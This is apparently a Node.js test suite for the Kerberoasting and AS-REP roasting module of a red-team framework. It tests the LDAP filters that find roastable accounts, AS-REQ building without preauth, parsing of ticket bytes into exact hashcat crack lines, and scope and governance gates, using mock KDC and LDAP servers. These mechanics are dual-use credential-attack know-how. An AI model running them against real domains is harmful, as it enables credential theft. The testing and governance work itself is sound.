// adroast.test.mjs — the GOVERNED AD TIER, rung 1 (ROAST COLLECTORS). Hermetic by
// construction: fixture Kerberos bytes are built with the same DER helpers the
// parser consumes, so the FORMAT PROOF is exact-string (construct fixture ticket
// bytes -> the precise hashcat/john line), the LDAP-targeting planner is pinned to
// the byte level, the AS-REQ builder round-trips, and a mock KDC / mock LDAP server
// drive the tools/adroast.mjs I/O shell. The gate matrix runs the real
// CallbackChannel; the evidence intake formats fixture agent bytes into audit
// events. No network, no DC, no Kerberos library.
//
// THE LAST TEST IS THE GUARDED LIVE PATH (opt-in: VARVEL_LIVE_ADROAST=1 AND
// VARVEL_AD_DC=<dc-ip>): detectDc probes the target; NO DC EVIDENCE -> SKIP
// CLEANLY (the lab range is a standalone Win11 box — roast validates hermetically).
//
// HOUSE RULE: everything this suite writes lives under repo-local varvel/.tmp —
// never os.tmpdir(). Settings discipline: VARVEL_SETTINGS_FILE points under .tmp
// for THIS process and every engagement name is unique.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { CallbackChannel } from '../engine/callback.mjs';
import {
  ADROAST_KINDS, ADROAST_ETYPES, planLdapTargeting, buildLdapFilterBytes, buildRoastSearchRequest,
  buildAsReq, parseApReq, parseAsRep, parseKrbError, splitCipher, formatTgsHash, formatAsrepHash,
  roastTicket, asrepTicket, parseAdRoastSpec, adRoastGate, adRoastSpecSha256,
  parseAdRoastEvidence, roastGraphItems, __internals,
} from '../engine/adroast.mjs';
import { ldapRoastSearch, asrepExchange, buildAsrepTaskData, detectDc, entryToAccount, roastEdrMarkers } from '../tools/adroast.mjs';
import { tlv, berSeq, berSet, berInt, berEnum, berOctet, readTlv, peelMessage, parseEnvelope, parseResult } from '../tools/ldapenum.mjs';
import { Settings } from '../engine/settings.mjs';

const TMP_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '.tmp');
mkdirSync(TMP_ROOT, { recursive: true });
const WORK = mkdtempSync(join(TMP_ROOT, 'adroast-test-'));
process.env.VARVEL_SETTINGS_FILE = join(WORK, 'settings.json');

let engSeq = 0;
const freshEng = () => 'adroast-' + (engSeq++) + '-' + Date.now();

const { kerbInt } = __internals;
const ctx = (n, inner) => tlv(0xa0 + n, inner);
const gstr = (s) => tlv(0x1b, Buffer.from(String(s), 'utf8'));

// ——— Fixture builders (the DER shapes a real KDC / a real KerberosRequestorSecurityToken
// emit, built from the same codec vocabulary the parser reads) ———
const CIPHER23 = Buffer.from(Array.from({ length: 80 }, (_, i) => i)); // 16-byte head MIC + 64 bytes
const CIPHER18 = Buffer.from(Array.from({ length: 100 }, (_, i) => (i * 7) & 0xff)); // 12-byte tail HMAC
const encData = (etype, cipher) => berSeq(ctx(0, kerbInt(etype)), ctx(1, kerbInt(5)), ctx(2, tlv(0x04, cipher)));
const principal = (nameType, comps) => berSeq(ctx(0, kerbInt(nameType)), ctx(1, berSeq(...comps.map(gstr))));

function fixtureApReq({ realm = 'CORP.LOCAL', spn = 'MSSQLSvc/db.corp.local:1433', etype = 23, cipher = CIPHER23, gssapi = true } = {}) {
  const sname = spn.split('/');
  const ticket = tlv(0x61, berSeq(
    ctx(0, kerbInt(5)),
    ctx(1, gstr(realm)),
    ctx(2, principal(2, sname)),
    ctx(3, encData(etype, cipher)),
  ));
  const apreq = tlv(0x6e, berSeq(
    ctx(0, kerbInt(5)), ctx(1, kerbInt(14)),
    ctx(2, tlv(0x03, Buffer.from([0x00, 0x20, 0x00, 0x00, 0x00]))),
    ctx(3, ticket),
    ctx(4, encData(etype, Buffer.alloc(96, 9))), // the authenticator — never parsed
  ));
  if (!gssapi) return apreq;
  const oid = tlv(0x06, Buffer.from([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02])); // 1.2.840.113554.1.2.2
  return tlv(0x60, Buffer.concat([oid, apreq]));
}

function fixtureAsRep({ realm = 'CORP.LOCAL', user = 'jdoe', etype = 23, cipher = CIPHER23 } = {}) {
  return tlv(0x6f, berSeq(
    ctx(0, kerbInt(5)), ctx(1, kerbInt(15)),
    ctx(3, gstr(realm)),
    ctx(4, principal(1, [user])),
    ctx(5, tlv(0x61, berSeq(ctx(0, kerbInt(5)), ctx(1, gstr(realm)), ctx(2, principal(2, ['krbtgt', realm])), ctx(3, encData(etype, cipher))))),
    ctx(6, encData(etype, cipher)),
  ));
}

const hex = (b) => Buffer.from(b).toString('hex');

// ——— FORMAT CORRECTNESS (the format proof: exact hashcat/john lines) ———
test('etype 23 TGS line is byte-exact (canonical 13100 layout)', () => {
  const h = formatTgsHash({ user: 'svc-sql', realm: 'CORP.LOCAL', spn: 'MSSQLSvc/db.corp.local:1433', etype: 23, cipher: CIPHER23 });
  assert.equal(h, '$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
});

test('etype 17/18 TGS lines split the 12-byte TRAILER and drop the SPN field (canonical 19600/19700)', () => {
  const h18 = formatTgsHash({ user: 'svc-sql', realm: 'CORP.LOCAL', spn: 'MSSQLSvc/db.corp.local:1433', etype: 18, cipher: CIPHER18 });
  assert.equal(h18, '$krb5tgs$18$svc-sql$CORP.LOCAL$' + hex(CIPHER18.subarray(CIPHER18.length - 12)) + '$' + hex(CIPHER18.subarray(0, CIPHER18.length - 12)));
  const h17 = formatTgsHash({ user: 'svc-sql', realm: 'CORP.LOCAL', spn: 'x/y', etype: 17, cipher: CIPHER18 });
  assert.ok(h17.startsWith('$krb5tgs$17$svc-sql$CORP.LOCAL$'));
  assert.equal(h17.split('$').length, 7); // '', 'krb5tgs', etype, user, realm, chk, edata2 — no SPN field
});

test('etype 23 ASREP line is byte-exact (18200 layout, the load-bearing colon)', () => {
  const h = formatAsrepHash({ user: 'jdoe', realm: 'CORP.LOCAL', etype: 23, cipher: CIPHER23 });
  assert.equal(h, '$krb5asrep$23$jdoe@CORP.LOCAL:' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
});

test('etype 17/18 ASREP lines use the user$realm layout (32100/32200)', () => {
  const h = formatAsrepHash({ user: 'jdoe', realm: 'CORP.LOCAL', etype: 18, cipher: CIPHER18 });
  assert.equal(h, '$krb5asrep$18$jdoe$CORP.LOCAL$' + hex(CIPHER18.subarray(CIPHER18.length - 12)) + '$' + hex(CIPHER18.subarray(0, CIPHER18.length - 12)));
});

test('unsupported etypes and short ciphers refuse loudly (no malformed line is ever emitted)', () => {
  assert.throws(() => formatTgsHash({ user: 'u', realm: 'R', spn: 'a/b', etype: 1, cipher: CIPHER23 }), /no known roast format/);
  assert.throws(() => formatAsrepHash({ user: 'u', realm: 'R', etype: 26, cipher: CIPHER23 }), /no known roast format/);
  assert.throws(() => formatTgsHash({ user: 'u', realm: 'R', spn: 'a/b', etype: 23, cipher: Buffer.alloc(20) }), /too short/);
  assert.throws(() => splitCipher(18, Buffer.alloc(20)), /too short/);
});

// ——— TICKET BYTE PARSING (fixture bytes -> parsed fields -> exact line) ———
test('parseApReq unwraps GSS-API and walks the ticket to the enc-part', () => {
  const t = parseApReq(fixtureApReq({}));
  assert.equal(t.msgType, 14);
  assert.equal(t.realm, 'CORP.LOCAL');
  assert.equal(t.spn, 'MSSQLSvc/db.corp.local:1433');
  assert.equal(t.etype, 23);
  assert.deepEqual(t.cipher, CIPHER23);
});

test('roastTicket: fixture AP-REQ bytes -> the exact hashcat string', () => {
  const r = roastTicket({ user: 'svc-sql', spn: 'MSSQLSvc/db.corp.local:1433', bytes: fixtureApReq({}) });
  assert.equal(r.kind, 'krb5tgs');
  assert.equal(r.hashcatMode, 13100);
  assert.equal(r.etypeName, 'rc4-hmac');
  assert.equal(r.hash, '$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
});

test('roastTicket covers the AES etypes etype-correctly', () => {
  const r = roastTicket({ user: 'svc-web', spn: 'HTTP/web.corp.local', bytes: fixtureApReq({ spn: 'HTTP/web.corp.local', etype: 18, cipher: CIPHER18, gssapi: false }) });
  assert.equal(r.hashcatMode, 19700);
  assert.equal(r.hash, '$krb5tgs$18$svc-web$CORP.LOCAL$' + hex(CIPHER18.subarray(CIPHER18.length - 12)) + '$' + hex(CIPHER18.subarray(0, CIPHER18.length - 12)));
});

test('parseAsRep + asrepTicket: fixture AS-REP -> the exact line; KRB-ERROR is an honest outcome', () => {
  const r = asrepTicket({ user: 'jdoe', bytes: fixtureAsRep({}) });
  assert.equal(r.hashcatMode, 18200);
  assert.equal(r.hash, '$krb5asrep$23$jdoe@CORP.LOCAL:' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
  const krbErr = tlv(0x7e, berSeq(ctx(0, kerbInt(5)), ctx(1, kerbInt(30)), ctx(6, kerbInt(25))));
  const e = parseKrbError(krbErr);
  assert.equal(e.errorCode, 25);
  assert.equal(e.name, 'KDC_ERR_PREAUTH_REQUIRED'); // the account is NOT roastable — said plainly
  assert.throws(() => parseAsRep(krbErr), /KRB-ERROR 25/);
});

// ——— THE AS-REQ BUILDER (round-trip: the bytes parse back to the ordered fields) ———
test('buildAsReq emits a well-formed [APPLICATION 10] with the ordered fields', () => {
  const req = buildAsReq({ user: 'jdoe', realm: 'corp.local', etypes: [23, 18], nonce: 0x12345678 });
  const head = readTlv(req, 0);
  assert.equal(head.tag, 0x6a);
  const seq = readTlv(head.value, 0);
  const kids = {};
  let pos = 0;
  while (pos < seq.value.length) { const t = readTlv(seq.value, pos); pos = t.next; kids[t.tag] = t.value; }
  const intOf = (v) => { let n = 0; for (const b of readTlv(v, 0).value) n = n * 256 + b; return n; };
  assert.equal(intOf(kids[0xa1]), 5);   // pvno
  assert.equal(intOf(kids[0xa2]), 10);  // msg-type AS-REQ
  assert.equal(kids[0xa3], undefined);  // NO padata — the DONT_REQ_PREAUTH mechanic
  const body = readTlv(kids[0xa4], 0);
  const bkids = {};
  let bp = 0;
  while (bp < body.value.length) { const t = readTlv(body.value, bp); bp = t.next; bkids[t.tag] = t.value; }
  assert.equal(readTlv(bkids[0xa2], 0).value.toString('utf8'), 'CORP.LOCAL'); // realm uppercased
  const snameSeq = readTlv(bkids[0xa3], 0); // PrincipalName SEQUENCE (krbtgt/CORP.LOCAL)
  assert.equal(snameSeq.tag, 0x30);
  const snameKids = [];
  let sp = 0;
  while (sp < snameSeq.value.length) { const t = readTlv(snameSeq.value, sp); sp = t.next; snameKids.push(t); }
  assert.equal(snameKids[0].tag, 0xa0); // name-type[0]
  const snameList = readTlv(snameKids[1].value, 0); // name-string[1] SEQUENCE OF
  const comps = [];
  let cp = 0;
  while (cp < snameList.value.length) { const t = readTlv(snameList.value, cp); cp = t.next; comps.push(t.value.toString('utf8')); }
  assert.deepEqual(comps, ['krbtgt', 'CORP.LOCAL']);
  const etypes = readTlv(bkids[0xa8], 0);
  const ev = [];
  let ep = 0;
  while (ep < etypes.value.length) { const t = readTlv(etypes.value, ep); ep = t.next; let n = 0; for (const b of t.value) n = n * 256 + b; ev.push(n); }
  assert.deepEqual(ev, [23, 18]);
  assert.equal(intOf(kids[0xa1]), 5); // pvno sanity
});

test('buildAsReq validates its fields and refuses unknown etypes', () => {
  assert.throws(() => buildAsReq({ user: 'bad user!', realm: 'CORP.LOCAL' }), /principal/);
  assert.throws(() => buildAsReq({ user: 'jdoe', realm: 'x' }), /realm/);
  assert.throws(() => buildAsReq({ user: 'jdoe', realm: 'CORP.LOCAL', etypes: [1] }), /etypes/);
});

// ——— THE LDAP-TARGETING PLANNER ———
test('the plans carry the canonical tradecraft filters', () => {
  const spn = planLdapTargeting('spn-accounts');
  assert.equal(spn.filter, '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))');
  assert.ok(spn.attributes.includes('servicePrincipalName'));
  const np = planLdapTargeting('no-preauth-accounts');
  assert.ok(np.filter.includes(':=4194304')); // DONT_REQ_PREAUTH bit-AND
  assert.throws(() => planLdapTargeting('everything'), /unknown class/);
});

test('buildLdapFilterBytes encodes the plan grammar (and/or/not/present/equality/extensibleMatch)', () => {
  const bytes = buildLdapFilterBytes(planLdapTargeting('spn-accounts').filter);
  assert.equal(bytes[0], 0xa0); // and
  // walk: first child is (objectClass=user) equalityMatch [3]
  const and = readTlv(bytes, 0);
  const first = readTlv(and.value, 0);
  assert.equal(first.tag, 0xa3);
  const eq = readTlv(first.value, 0);
  assert.equal(readTlv(eq.value, 0).value.toString('utf8'), 'objectClass');
  // second child: (servicePrincipalName=*) present [7]
  const second = readTlv(and.value, first.next);
  assert.equal(second.tag, 0x87);
  assert.equal(second.value.toString('utf8'), 'servicePrincipalName');
  // third child: the NOT wrapping an extensibleMatch [9] with the bit-AND OID
  const third = readTlv(and.value, second.next);
  assert.equal(third.tag, 0xa2);
  const ext = readTlv(third.value, 0);
  assert.equal(ext.tag, 0xa9);
  assert.equal(readTlv(ext.value, 0).value.toString('utf8'), '1.2.840.113556.1.4.803');
  assert.throws(() => buildLdapFilterBytes('(objectClass=user'), /expected/);
  assert.throws(() => buildLdapFilterBytes('(&(a=b))junk'), /trailing/);
});

test('buildRoastSearchRequest is a decodable subtree SearchRequest carrying the plan', () => {
  const req = buildRoastSearchRequest(7, 'DC=corp,DC=local', planLdapTargeting('spn-accounts'));
  const peeled = peelMessage(req);
  assert.ok(peeled);
  const env = parseEnvelope(peeled.message);
  assert.equal(env.messageId, 7);
  assert.equal(env.opTag, 0x63); // SearchRequest
  const base = readTlv(env.opValue, 0);
  assert.equal(base.value.toString('utf8'), 'DC=corp,DC=local');
  const scope = readTlv(env.opValue, base.next);
  assert.equal(scope.value[0], 2); // wholeSubtree
});

// ——— THE I/O SHELL over a mock LDAP server / mock KDC ———
function mockSocket(script) {
  const handlers = { data: null, close: null };
  return {
    write(buf) {
      const msg = peelMessage(buf);
      if (!msg) return;
      const env = parseEnvelope(msg.message);
      const respond = script(env.opTag, env.messageId);
      if (respond) for (const chunk of respond) setImmediate(() => handlers.data && handlers.data(chunk));
    },
    end() { handlers.close && handlers.close(); },
    onData(cb) { handlers.data = cb; },
    onClose(cb) { handlers.close = cb; },
  };
}
const RESULT_OK = (id, appTag) => berSeq(berInt(id), tlv(appTag, Buffer.concat([berEnum(0), berOctet(''), berOctet('')])));
const ENTRY = (id, attrs) => berSeq(berInt(id), tlv(0x64, Buffer.concat([
  berOctet('CN=x,DC=corp,DC=local'),
  berSeq(...Object.entries(attrs).map(([k, vals]) => berSeq(berOctet(k), berSet(...vals.map(berOctet))))),
])));

test('ldapRoastSearch: bind + planned search + entry mapping over the mock server', async () => {
  const script = (opTag) => {
    if (opTag === 0x60) return [RESULT_OK(1, 0x61)];
    if (opTag === 0x63) return [
      ENTRY(2, {
        sAMAccountName: ['svc-sql'], servicePrincipalName: ['MSSQLSvc/db.corp.local:1433'],
        adminCount: ['1'], memberOf: ['CN=Domain Admins,CN=Users,DC=corp,DC=local'], userAccountControl: ['512'],
      }),
      ENTRY(2, { sAMAccountName: ['svc-disabled'], servicePrincipalName: ['HTTP/x.corp.local'], userAccountControl: ['514'] }),
      RESULT_OK(2, 0x65),
    ];
    return null;
  };
  const r = await ldapRoastSearch('10.0.0.5', {
    plan: planLdapTargeting('spn-accounts'), baseDN: 'DC=corp,DC=local',
    bindDN: 'operator@corp.local', password: 'x', timeout: 500,
    connectImpl: async () => mockSocket(script),
  });
  assert.equal(r.ok, true);
  assert.equal(r.accounts.length, 1); // the disabled account is dropped honestly
  assert.equal(r.accounts[0].user, 'svc-sql');
  assert.equal(r.accounts[0].adminCount, 1);
  assert.equal(r.accounts[0].daClass, true); // Domain Admins membership heuristic
  assert.deepEqual(r.accounts[0].spns, ['MSSQLSvc/db.corp.local:1433']);
});

test('ldapRoastSearch: bind refusal and scope refusal are loud, first-class outcomes', async () => {
  const refuse = (opTag) => opTag === 0x60 ? [berSeq(berInt(1), tlv(0x61, Buffer.concat([berEnum(49), berOctet(''), berOctet('80090308')])))] : null;
  const r1 = await ldapRoastSearch('10.0.0.5', { plan: planLdapTargeting('spn-accounts'), baseDN: 'DC=x', timeout: 500, connectImpl: async () => mockSocket(refuse) });
  assert.equal(r1.ok, false);
  assert.match(r1.verdict, /refused the bind/);
  const r2 = await ldapRoastSearch('192.168.99.5', { plan: planLdapTargeting('spn-accounts'), baseDN: 'DC=x', cidrs: ['10.0.0.0/8'], timeout: 500, connectImpl: async () => { throw new Error('MUST NOT CONNECT'); } });
  assert.equal(r2.refused, true);
  assert.match(r2.verdict, /OUTSIDE the signed scope ring/);
});

test('asrepExchange: framed AS-REQ out, framed AS-REP in (mock KDC), then the exact line', async () => {
  const asrep = fixtureAsRep({});
  let sawRequest = null;
  const connectImpl = async (host, port) => {
    assert.equal(port, 88);
    const handlers = { data: null, close: null };
    return {
      write(buf) {
        sawRequest = buf.subarray(4); // strip the 4-byte BE frame
        const frame = Buffer.alloc(4); frame.writeUInt32BE(asrep.length, 0);
        setImmediate(() => handlers.data && handlers.data(Buffer.concat([frame, asrep])));
      },
      end() {}, onData(cb) { handlers.data = cb; }, onClose(cb) { handlers.close = cb; },
    };
  };
  const req = buildAsReq({ user: 'jdoe', realm: 'CORP.LOCAL', nonce: 42 });
  const out = await asrepExchange('10.0.0.5', { requests: [{ user: 'jdoe', asreq: req }], timeout: 500, connectImpl });
  assert.equal(out.length, 1);
  assert.ok(!out[0].error);
  assert.deepEqual(Buffer.from(out[0].asrepB64, 'base64'), asrep);
  assert.deepEqual(sawRequest, req); // the shell sent EXACTLY the engine-built bytes
  const line = asrepTicket({ user: 'jdoe', bytes: out[0].asrepB64 });
  assert.equal(line.hash, '$krb5asrep$23$jdoe@CORP.LOCAL:' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
});

test('asrepExchange: a KDC error lands as an honest per-account outcome', async () => {
  const krbErr = tlv(0x7e, berSeq(ctx(0, kerbInt(5)), ctx(1, kerbInt(30)), ctx(6, kerbInt(25))));
  const connectImpl = async () => {
    const handlers = { data: null, close: null };
    return {
      write() { const f = Buffer.alloc(4); f.writeUInt32BE(krbErr.length, 0); setImmediate(() => handlers.data && handlers.data(Buffer.concat([f, krbErr]))); },
      end() {}, onData(cb) { handlers.data = cb; }, onClose(cb) { handlers.close = cb; },
    };
  };
  const out = await asrepExchange('10.0.0.5', { requests: [{ user: 'bob', asreq: buildAsReq({ user: 'bob', realm: 'CORP.LOCAL' }) }], timeout: 500, connectImpl });
  assert.ok(out[0].asrepB64); // the KRB-ERROR bytes come back; the FORMATTER names it
  assert.throws(() => asrepTicket({ user: 'bob', bytes: out[0].asrepB64 }), /KRB-ERROR 25.*PREAUTH_REQUIRED/);
});

test('buildAsrepTaskData produces spec-parseable task data (the agent replays exactly these bytes)', () => {
  const data = buildAsrepTaskData({ dc: '10.0.0.5', realm: 'corp.local', users: ['jdoe', 'asmith'] });
  const spec = parseAdRoastSpec('adroast-asrep', data);
  assert.equal(spec.realm, 'CORP.LOCAL');
  assert.equal(spec.requests.length, 2);
  assert.equal(Buffer.from(spec.requests[0].asreqB64, 'base64')[0], 0x6a);
});

// ——— SPEC GATE ———
test('spec parse matrix: kinds, shapes, caps, loud refusals', () => {
  assert.throws(() => parseAdRoastSpec('adroast-yolo', '{}'), /unknown kind/);
  assert.throws(() => parseAdRoastSpec('adroast-enum', 'not json'), /not valid JSON/);
  assert.throws(() => parseAdRoastSpec('adroast-enum', '{}'), /dc must be/);
  const en = parseAdRoastSpec('adroast-enum', '{"dc":"10.0.0.5"}');
  assert.deepEqual(en, { kind: 'adroast-enum', dc: '10.0.0.5', realm: null });
  const kb = parseAdRoastSpec('adroast-kerberoast', '{"dc":"10.0.0.5","accounts":[{"user":"svc-sql","spn":"MSSQLSvc/db.corp.local:1433"}]}');
  assert.equal(kb.accounts.length, 1);
  assert.throws(() => parseAdRoastSpec('adroast-kerberoast', '{"dc":"10.0.0.5","accounts":[{"user":"svc-sql","spn":"noslash"}]}'), /SPN shape/);
  assert.throws(() => parseAdRoastSpec('adroast-asrep', '{"dc":"10.0.0.5"}'), /realm is required/);
  assert.throws(() => parseAdRoastSpec('adroast-asrep', '{"dc":"10.0.0.5","realm":"CORP.LOCAL","requests":[]}'), /non-empty/);
  assert.throws(() => parseAdRoastSpec('adroast-asrep', JSON.stringify({ dc: '10.0.0.5', realm: 'CORP.LOCAL', requests: [{ user: 'jdoe', asreqB64: Buffer.from('ZZ').toString('base64') }] })), /not an AS-REQ/);
});

test('the spec pin excludes request blobs (random nonces never destabilize the audit hash)', () => {
  const a = parseAdRoastSpec('adroast-asrep', buildAsrepTaskData({ dc: '10.0.0.5', realm: 'CORP.LOCAL', users: ['jdoe'] }));
  const b = parseAdRoastSpec('adroast-asrep', buildAsrepTaskData({ dc: '10.0.0.5', realm: 'CORP.LOCAL', users: ['jdoe'] }));
  assert.equal(adRoastSpecSha256(a), adRoastSpecSha256(b)); // same ORDER, same pin — different nonces
});

test('operator LDAP bind creds parse through but the password is never pinned', () => {
  const withCreds = parseAdRoastSpec('adroast-enum', '{"dc":"10.0.0.5","ldapUser":"operator","ldapDomain":"CORP","ldapPassword":"R0ast-Secret!"}');
  assert.equal(withCreds.ldapUser, 'operator');
  assert.equal(withCreds.ldapPassword, 'R0ast-Secret!'); // rides the task data to the agent — ONLY there
  const plain = parseAdRoastSpec('adroast-enum', '{"dc":"10.0.0.5"}');
  assert.equal(adRoastSpecSha256(withCreds), adRoastSpecSha256(plain), 'the pin is the order, never the secret');
  assert.ok(!adRoastSpecSha256(withCreds).includes('R0ast') && !JSON.stringify({ pin: adRoastSpecSha256(withCreds) }).includes('R0ast-Secret!'));
});

// ——— ENGAGEMENT GATE + CHANNEL (the gate matrix) ———
function gatedChannel(eng) {
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['10.0.0.0/8'] }, onEvent: (t, o) => events.push({ type: t, ...o }) });
  const { agentId } = ch.registerAgent({ label: 'gated' });
  return { ch, events, agentId };
}

test('the gate is fail-closed for every adroast kind and loud when refused', () => {
  const { ch, events, agentId } = gatedChannel(freshEng());
  for (const kind of ADROAST_KINDS) {
    let err = null;
    try { ch.task(agentId, kind, '{"dc":"10.0.0.5","realm":"CORP.LOCAL"}'); } catch (e) { err = e; }
    assert.ok(err, kind + ' must throw');
    assert.equal(err.code, 'GOVERNANCE');
    assert.match(err.message, /ad\.roast.*OFF/s);
  }
  assert.ok(events.filter((e) => e.type === 'task.refused').length >= 3);
  assert.equal(adRoastGate('definitely-off-' + Date.now()).ok, false);
});

test('gate on: the task queues, audits adroast.task with the spec pin; out-of-ring DC is refused even then', () => {
  const eng = freshEng();
  Settings.for(eng).set('ad.roast', true);
  const { ch, events, agentId } = gatedChannel(eng);
  const taskId = ch.task(agentId, 'adroast-kerberoast', '{"dc":"10.0.0.5","realm":"CORP.LOCAL","accounts":[{"user":"svc-sql","spn":"MSSQLSvc/db.corp.local:1433"}]}');
  assert.ok(taskId);
  const ev = events.find((e) => e.type === 'adroast.task');
  assert.ok(ev, 'adroast.task audited');
  assert.equal(ev.dc, '10.0.0.5');
  assert.ok(ev.specSha256);
  let err = null;
  try { ch.task(agentId, 'adroast-enum', '{"dc":"192.168.50.9"}'); } catch (e) { err = e; }
  assert.ok(err && err.code === 'GOVERNANCE');
  assert.match(err.message, /OUTSIDE the signed scope ring/);
  let err2 = null;
  try { ch.task(agentId, 'adroast-enum', '{"dc":"dc01.corp.local"}'); } catch (e) { err2 = e; }
  assert.ok(err2 && err2.code === 'GOVERNANCE'); // hostname DC: not scope-verifiable -> refused
});

// ——— INTAKE: fixture agent bytes -> the audit event with EXACT hashes ———
test('a kerberoast result lands adroast.collected with exact hashcat lines + graph items', () => {
  const eng = freshEng();
  Settings.for(eng).set('ad.roast', true);
  const { ch, events, agentId } = gatedChannel(eng);
  const taskId = ch.task(agentId, 'adroast-kerberoast', '{"dc":"10.0.0.5"}');
  const body = JSON.stringify({
    op: 'kerberoast', pid: 1234, dc: '10.0.0.5', realm: 'CORP.LOCAL',
    accounts: [{ user: 'svc-sql', spns: ['MSSQLSvc/db.corp.local:1433'], adminCount: 1, groups: ['CN=Domain Admins,CN=Users,DC=corp,DC=local'] }],
    tickets: [
      { user: 'svc-sql', spn: 'MSSQLSvc/db.corp.local:1433', apreqB64: fixtureApReq({}).toString('base64') },
      { user: 'svc-web', spn: 'HTTP/web.corp.local', apreqB64: fixtureApReq({ spn: 'HTTP/web.corp.local', etype: 18, cipher: CIPHER18 }).toString('base64') },
      { user: 'svc-bad', spn: 'X/y.corp.local', error: 'The NetworkBuffer is corrupt' },
    ],
    errors: [], at: new Date().toISOString(),
  });
  ch._intakeResult(ch.agents.get(agentId), taskId, Buffer.from(body));
  const ev = events.find((e) => e.type === 'adroast.collected');
  assert.ok(ev, 'adroast.collected audited');
  assert.equal(ev.hashCount, 2);
  assert.equal(ev.hashes[0].hash, '$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
  assert.equal(ev.hashes[1].hashcatMode, 19700);
  assert.ok(ev.errors.some((e) => /svc-bad/.test(e)), 'per-ticket failures land in errors[] honestly');
  const items = roastGraphItems(ev);
  assert.equal(items.accounts.length, 2); // svc-sql (enum) + svc-web (hash-only)
  assert.equal(items.accounts.find((a) => a.user === 'svc-sql').daClass, true);
  const markers = roastEdrMarkers(ev);
  assert.ok(markers.includes('MSSQLSvc/db.corp.local:1433') && markers.includes('10.0.0.5'));
});

test('an asrep result formats fixture AS-REPs; unparseable evidence emits no event', () => {
  const eng = freshEng();
  Settings.for(eng).set('ad.roast', true);
  const { ch, events, agentId } = gatedChannel(eng);
  const taskId = ch.task(agentId, 'adroast-asrep', buildAsrepTaskData({ dc: '10.0.0.5', realm: 'CORP.LOCAL', users: ['jdoe'] }));
  const body = JSON.stringify({
    op: 'asrep', pid: 1234, dc: '10.0.0.5', realm: 'CORP.LOCAL',
    reps: [{ user: 'jdoe', asrepB64: fixtureAsRep({}).toString('base64') }], errors: [], at: new Date().toISOString(),
  });
  ch._intakeResult(ch.agents.get(agentId), taskId, Buffer.from(body));
  const ev = events.find((e) => e.type === 'adroast.collected');
  assert.ok(ev);
  assert.equal(ev.hashes[0].hash, '$krb5asrep$23$jdoe@CORP.LOCAL:' + hex(CIPHER23.subarray(0, 16)) + '$' + hex(CIPHER23.subarray(16)));
  assert.equal(parseAdRoastEvidence('adroast REFUSED: agent-side roast collection is OFF'), null);
  assert.equal(parseAdRoastEvidence('{"op":"mystery"}'), null);
});

// ——— THE GUARDED LIVE PATH (opt-in; skips cleanly when the lab has no DC) ———
// The lab range is a standalone Win11 box (enclave/vm-lab.mjs — no domain controller
// exists in the topology), so this validates HERMETICALLY here. On a range WITH a DC:
//   VARVEL_LIVE_ADROAST=1 VARVEL_AD_DC=10.0.0.5 node --test test/adroast.test.mjs
test('GUARDED LIVE: DC detection + roast collection against a real DC (env-gated)', async (t) => {
  if (process.env.VARVEL_LIVE_ADROAST !== '1' || !process.env.VARVEL_AD_DC) {
    t.skip('guarded live roast: set VARVEL_LIVE_ADROAST=1 VARVEL_AD_DC=<dc-ip> on a range that HAS a DC (the standalone-Win11 lab does not)');
    return;
  }
  const dc = await detectDc(process.env.VARVEL_AD_DC, { timeout: 3000 });
  if (!dc.isDc) {
    t.skip('no AD evidence at VARVEL_AD_DC (' + dc.verdict + ') — skipping cleanly, exactly as designed');
    return;
  }
  assert.ok(dc.realm, 'realm derived from rootDSE');
  const r = await ldapRoastSearch(process.env.VARVEL_AD_DC, {
    plan: planLdapTargeting('spn-accounts'), baseDN: dc.baseDN,
    bindDN: process.env.VARVEL_AD_BINDDN || '', password: process.env.VARVEL_AD_BINDPW || '', timeout: 6000,
  });
  assert.ok(r.ok, r.verdict);
  t.diagnostic('live enum: ' + r.accounts.length + ' SPN account(s); AS-REP exchange runs only with explicit VARVEL_AD_ASREP=1');
});
